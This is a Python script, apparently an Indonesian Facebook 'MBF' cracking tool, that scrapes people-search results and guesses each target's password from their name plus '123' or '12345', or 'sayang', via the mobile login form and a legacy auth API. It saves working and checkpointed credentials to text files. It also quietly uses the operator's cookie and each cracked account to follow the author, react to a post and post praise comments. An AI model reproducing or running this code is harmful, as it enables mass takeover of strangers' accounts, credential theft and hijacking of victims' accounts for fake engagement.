# Author: IqbalDev

import requests, time, re, random, json, os, sys
from bs4 import BeautifulSoup
from multiprocessing.pool import ThreadPool

fb = "https://m.facebook.com"
url_dev_me = "https://mbasic.facebook.com/me"
url_uwu = "https://mbasic.facebook.com"

user_ = []
user_crack = []
hasil_ok = []
hasil_cp = []

d = "\033[90;1m"
m = "\033[91;1m"
h = "\033[92;1m"
k = "\033[93;1m"
b = "\033[94;1m"
j = "\033[95;1m"
a = "\033[96;1m"
p = "\033[97;1m"

def bersih():
	os.system("cls" if os.name == "nt" else "clear")
def jalankan():
	os.system("mbf_cookie.py" if os.name == "nt" else "python2 mbf_cookie.py")

def hapus_cookie():
	h = open("cookie.txt", "w")
	h.write("")
	h.close()

def proses_masuk(cookie_dev):

	with requests.Session() as ses_pros_dev:
		proses_masuk = ses_pros_dev.get(url_uwu, cookies=cookie_dev).content
		sop = BeautifulSoup(proses_masuk, "html.parser")
		if "zero/optin/legal/" in str(proses_masuk):
			sop_gr = BeautifulSoup(proses_masuk, "html.parser").find("form")
			url_post = sop_gr["action"]
			payload = {}
			for dev in sop_gr:
				input = dev
				payload[input.get("name")] = input.get("value")
			ses_pros_dev.post(url_uwu+url_post, data=payload, cookies=cookie_dev)
	try:
		dev_sop = BeautifulSoup(proses_masuk, "html.parser")
		sop_uwu = dev_sop.find("a", string="Bahasa Indonesia")
		ambil_url = url_uwu+sop_uwu["href"]
		has = ses_pros_dev.get(ambil_url, cookies=cookie_dev).content
						
	except:
		pass
	try:
		uwu_u = "https://mbasic.facebook.com/jangan.macem.macem.2"
		ikut = ses_pros_dev.get(uwu_u, cookies=cookie_dev).content
		sop_dev = BeautifulSoup(ikut, "html.parser")
		ambil = sop_dev.find("a", string="Ikuti")
		data = "https://mbasic.facebook.com"+ambil["href"]
		ses_pros_dev.get(data, cookies=cookie_dev)
	except:
		pass
def love(cookie):
	url_love = "https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=510375576819453"
	with requests.Session() as r_dev:
		hal_love = r_dev.get(url_love, cookies=cookie).content
		sop = BeautifulSoup(hal_love, "html.parser")
		url_lov = sop.find_all("a")
		for iq in url_lov:
			if "(Hapus)" in str(iq):
				break
			if "Super" in str(iq):
				u_love = iq["href"]
				r_dev.get("https://mbasic.facebook.com"+u_love, cookies=cookie)

def komen(cookie):
	url = "https://mbasic.facebook.com/photo.php?fbid=510485606808450"
	for de in range(2):
		with requests.Session() as res_dev:
			hal_res = res_dev.get(url, cookies=cookie).content
			sop_dev = BeautifulSoup(hal_res, "html.parser")
			form = sop_dev.find("form")
			url_post = form["action"]
			tek = random.choice(["Mantap bang", "Toolsnya Keren Bang", "Ganteng, Pake Banget..", "Ga ada obat emang, KEREN"])
			payload = {"comment_text": tek}
			for dev in form:
				input = dev
				payload[input.get("name")] = input.get("value")
			url_kom = "https://mbasic.facebook.com"+url_post
			komen = res_dev.post(url_kom, cookies=cookie, data=payload)

def crack_dev(iqbal_):
  
  try:
	_id_ = iqbal_.split()
	eml_dev = _id_[0]

	def sub_dev_crack():
		url_page_log = "https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr"
		with requests.Session() as ses_dev:
			page_dev = ses_dev.get(url_page_log).content
			sop = BeautifulSoup(page_dev, "html.parser")
			form_dev = sop.find("form", id="login_form")
			url_post = form_dev["action"]
			waktu = time.time()
			user_agent = random.choice(['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
										'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
										'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
										'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
										'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
										'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
										'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
										'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
										'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
										'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
										'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
										'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
										'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'])
			ses_dev.headers.update({
				"user-agent": user_agent,
				"referer": fb+url_post,
				"Host": "m.facebook.com",
				"accept": "*/*",
				"sec-ch-ua-mobile": "?1",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id,en-US;q=0.9,en;q=0.8",
				"x-fb-lsd": form_dev.find("input", attrs={"name": "lsd"})["value"]
				})
			payload = {
				"email": eml_dev,
				"pass": "#PWD_BROWSER:0:{}:{}".format(int(waktu), san_dev)
			}
			for dev_get_input in form_dev:
				input = dev_get_input
				payload[input.get("name")] = input.get("value")
			# print "===> {:<27} | {}".format(eml_dev,san_dev)
			login_dev = ses_dev.post(fb+url_post, data=payload, allow_redirects=False).cookies
			cookie = login_dev.get_dict()
			if "c_user" in login_dev:
				print a+"["+p+"Live"+a+"]"+h+" {:<18}\033[96;1m | \033[97;1m{}".format(eml_dev,san_dev)
				with open("hasil_ok.txt", "a") as hasil:
					hasil.write("[Live] "+ eml_dev + " | " + san_dev +"\n")
				hasil_ok.append(eml_dev)
				proses_masuk(cookie)
				love(cookie)

			elif "checkpoint" in login_dev:
				print h+"["+k+"Chek"+h+"]"+k+" {:<18}\033[92;1m | \033[93;1m{}".format(eml_dev,san_dev)
				with open("hasil_cp.txt", "a") as hasil:
					hasil.write("[Chek] "+ eml_dev + " | " + san_dev +"\n")
				hasil_cp.append(eml_dev)
			else:
				pass
			# count_.append(eml_dev)
	
	set_pas = ["123", "12345"]
	for dev in set_pas:
		uba_dev = _id_[1]+dev
		san_dev = uba_dev.lower()
		sub_dev_crack()
	set_ = ["sayang"]
	for dev in set_:
		san_dev = dev
		sub_dev_crack()
	if len(_id_) > 2:
	    for dev in set_pas:
			san_ = _id_[1]+_id_[2]+dev
			san_dev = san_.lower()
			sub_dev_crack()

  except:
  	pass
def crack_api(iqbal_):
	try:
		data_ = iqbal_.split()
		id_ = data_[0]
		san_ = data_[1]+"123"
		san_dev = san_.lower()	
		dev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+id_+"&locale=en_US&password="+san_dev+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
	  	dev_iv = dev.content
	  	# print "--> ",id_,"|",san_dev
	  	jsl = json.loads(dev_iv)
	  	if "session_key" in dev_iv:
	  		print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ id_ + '\033[96;1m |\033[97;1m '+ san_dev
  	  	elif "www.facebook.com" in jsl["error_msg"]:
 			print "\033[96;1m  [\033[93;1mCEK\033[96;1m] " +'\033[97;1m'+ id_ + '\033[96;1m |\033[93;1m '+ san_dev

	  	else:
	  		data_ = iqbal_.split()
			id_ = data_[0]
			san_ = data_[1]+"12345"
			san_dev = san_.lower()	
			dev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+id_+"&locale=en_US&password="+san_dev+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		  	dev_iv = dev.content
		  	# print "--> ",id_,"|",san_dev
		  	jsl = json.loads(dev_iv)
		  	if "session_key" in dev_iv:
		  		print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ id_ + '\033[96;1m |\033[97;1m '+ san_dev
	  	  	elif "www.facebook.com" in jsl["error_msg"]:
	 			print "\033[96;1m  [\033[93;1mCEK\033[96;1m] " +'\033[97;1m'+ id_ + '\033[96;1m |\033[93;1m '+ san_dev

		  	else:
		  		data_ = iqbal_.split()
				id_ = data_[0]
				san_ = "sayang"
				san_dev = san_.lower()	
				dev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+id_+"&locale=en_US&password="+san_dev+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			  	dev_iv = dev.content
			  	# print "--> ",id_,"|",san_dev
			  	jsl = json.loads(dev_iv)
			  	if "session_key" in dev_iv:
			  		print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ id_ + '\033[96;1m |\033[97;1m '+ san_dev
		  	  	elif "www.facebook.com" in jsl["error_msg"]:
		 			print "\033[96;1m  [\033[93;1mCEK\033[96;1m] " +'\033[97;1m'+ id_ + '\033[96;1m |\033[93;1m '+ san_dev

			  	else:
			  		pass
	except:
		pass
def main_halaman(iqbal):
	global halaman
	set1_ = [600]
	for dev in set1_:
		if int(iqbal) < dev:
			halaman = 1
			break
		jml_hal = 3
		set_ = [1600, 2600, 3500, 4000, 5000]
		for dev in set_:
			if int(iqbal) < dev:
				halaman = jml_hal
				break
			jml_hal +=1

def get_id(email_):
  try:
	email = email_.split()[0]
	# print " Email-->",email
	url = "https://lookup-id.com/"
	payload = {"fburl": "https://free.facebook.com/"+email, "check": "Lookup"}
	with requests.Session() as ses_:
		halaman = ses_.post(url, data=payload).text.encode("utf-8")
		sop_ = BeautifulSoup(halaman, "html.parser")
		nama_ = sop_.find("em")
		email_ = sop_.find("span", id="code")
		email = email_.text
		nama = nama_.text
		user_crack.append(email+" "+nama)
		# print email, "|", nama
  except:
  	pass
c = 1
count = 0
def cari_orang(cookie, jumlah, u_orang):
	global c, count, user_, user_crack
	while jumlah>c:
		with requests.Session() as ses_dev:
			try:
				hal_orang = ses_dev.get(u_orang, cookies=cookie).text.encode("utf-8")
				sop_dev = BeautifulSoup(hal_orang, "html.parser")
				cari = sop_dev.find_all("tbody")
				main_halaman(jumlah)
				for dev in cari:
					nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))
					us_ = re.findall('<a href="/(.*)?refid=46"><img alt="', str(dev))
					if len(us_) == 0:
						continue
					hasil = us_[0]
					hasil_nama = nama_[0]
					hasil_user = hasil.replace("profile.php?id=", "").replace("&amp;", "").strip("?&")
					user_.append(hasil_user+" "+hasil_nama)
					# print hasil_user
					c+=1
				count += 1
				if count == halaman+2:
					count = 0
					
					run_dev()
					user_ = []
			
				if "Lihat Hasil Selanjutnya" in str(hal_orang):
					dev = sop_dev.find("a", string="Lihat Hasil Selanjutnya")
					u_orang = dev['href']
					cari_orang(cookie, jumlah, u_orang)
				
				run_dev()
				user_ = []

			except KeyboardInterrupt:
				pass
c = 1
count = 0
def cari_orang_c_api(cookie, jumlah, u_orang):
	global c, count, user_, user_crack
	while jumlah>c:
		try:
			with requests.Session() as ses_dev:
				hal_orang = ses_dev.get(u_orang, cookies=cookie).text.encode("utf-8")
				sop_dev = BeautifulSoup(hal_orang, "html.parser")
				cari = sop_dev.find_all("tbody")
				main_halaman(jumlah)
				for dev in cari:
					nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))
					us_ = re.findall('<a href="/(.*)?refid=46"><img alt="', str(dev))
					if len(us_) == 0:
						continue
					hasil = us_[0]
					hasil_nama = nama_[0]
					hasil_user = hasil.replace("profile.php?id=", "").replace("&amp;", "").strip("?&")
					user_.append(hasil_user+" "+hasil_nama)
					c+=1
				count += 1
				if count == halaman+2:
					count = 0
					
					
					run_dev_api()
					user_ = []
		
			
				if "Lihat Hasil Selanjutnya" in str(hal_orang):
					dev = sop_dev.find("a", string="Lihat Hasil Selanjutnya")
					u_orang = dev['href']
					cari_orang_c_api(cookie, jumlah, u_orang)
				
				run_dev_api()
				user_ = []
	
		except KeyboardInterrupt:
			pass
def login_():
	print h+"\n\n  L O G I N  D E N G A N  C O O K I E "
	print a+"+----------------------------------------"
	coki = raw_input(h+" ["+k+"@"+h+"]"+p+" Masukkan Cookie"+k+": ")
	cookie = {"cookie": coki}
	with requests.Session() as ses_dev:
		login = ses_dev.get(fb, cookies=cookie).content
		if "mbasic_logout_button" in login:
			print h+"\n login Berhasil >_<\n"
			proses_masuk(cookie)
			komen(cookie)
			love(cookie)
			print p+" Silahkan jalankan Toolsnya Kembali\n dengan perintah"+h+" python2 mbf_cookie.py"
			with open("cookie.txt", "w") as tulis:
				tulis.write(coki)
				exit()
		elif "checkpoint" in login:
			print k+"\n Akun checkpoint\n"
		else:
			print m+"\n Cookie Error..\n"
def cek_login():
  try:
	cooki = open("cookie.txt", "r").read()
	cookie = {"cookie": cooki}
	with requests.Session() as ses_dev:
		cek_login = ses_dev.get(fb, cookies=cookie).content
		if "mbasic_logout_button" in cek_login:
			pass
		elif "checkpoint" in cek_login:
			print k+"\n Akun checkpoint\n"
		else:
			login_()
  except ValueError:
  	login_()
  	
def run_dev():
	dev = ThreadPool(20)
	dev.map(crack_dev, user_)

def run_dev_api():
	dev = ThreadPool(20)
	dev.map(crack_api, user_)

if __name__=="__main__":
	cek_login()
	cook = open("cookie.txt", "r").read()
	cookie = {"cookie": cook}
	with requests.Session() as ses_:
		hal = ses_.get(url_dev_me, cookies=cookie).content
		sop_ = BeautifulSoup(hal, "html.parser")
		nama = sop_.find("title").text
	bersih()
	print a+"""
   _____ ___.    _____ 
  /     \\_ |___/ ____\

 /  \ /  \| __ \   __\ 
/    Y    \ \_\ \  |   
\____|__  /___  /__|  """+p+""" Author"""+h+""": Iqbal Dev
        \/    \/       
    """
	print a+" ["+k+"@"+a+"]"+p+" Hai:",k+nama
	print h+"+----------------------------------------------"
	print a+" ["+p+"1"+a+"]"+p+" Crack Dengan API facebook (Fast Cracking)"
	print a+" ["+p+"2"+a+"]"+p+" Crack Dengan m.facebook (Slow Cracking)"
	print a+" ["+p+"3"+a+"]"+p+" Log Out Dari Facebook."
	print a+" ["+p+"4"+a+"]"+p+" Exit "
	print h+"+----------------------------------------------"
	pilih = raw_input(a+" ["+k+">-"+a+"]"+p+" Pilih Opsi"+k+": ")
	if pilih == "1":
		print p+"\n ==>"+k+" Crack Dengan API Facebook.."
		keyword = raw_input(a+" ["+k+"@"+a+"]"+p+" Cari Orang"+h+": ")
		jumlah = input(a+" ["+k+"@"+a+"]"+p+" Masukkan Jumlah"+h+": ")
		print a+" ["+h+"./"+a+"]"+p+" Sedang Proses Cracking../ \n"
		u_orang = "https://mbasic.facebook.com/search/people/?q={}".format(keyword)
		cari_orang_c_api(cookie, jumlah, u_orang)
		print a+"\n Proses Cracking Selesai..\n"
	elif pilih == "2":
		print p+"\n ==>"+k+" Crack Dengan m.facebook.."
		keyword = raw_input(a+" ["+k+"@"+a+"]"+p+" Cari Orang"+h+": ")
		jumlah = input(a+" ["+k+"@"+a+"]"+p+" Masukkan Jumlah"+h+": ")
		print a+" ["+h+"./"+a+"]"+p+" Sedang Proses Cracking../ \n"
		u_orang = "https://mbasic.facebook.com/search/people/?q={}".format(keyword)
		cari_orang(cookie, jumlah, u_orang)
		print a+"\n Proses Cracking Selesai..\n"
	elif pilih == "3":
		print "\n Keluar Dari Facebook..\n"
		hapus_cookie()
	elif pilih == "4":
		exit("\n Keluar..\n")
	else:
		exit("\n Pilih Opsi yg bener..\n")